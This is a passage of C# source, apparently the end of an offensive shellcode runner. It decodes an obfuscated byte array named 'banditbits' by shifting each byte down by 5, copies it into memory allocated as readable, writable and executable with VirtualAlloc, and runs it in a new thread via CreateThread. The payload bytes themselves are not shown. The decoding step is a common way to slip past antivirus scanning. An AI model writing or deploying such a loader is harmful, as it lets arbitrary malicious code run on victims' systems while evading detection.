
            for (int i = 0; i < banditbits.Length; i++)
            {
                banditbits[i] = (byte)(((uint)banditbits[i] - 5) & 0xFF);
            }

            int size = banditbits.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(banditbits, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}

      

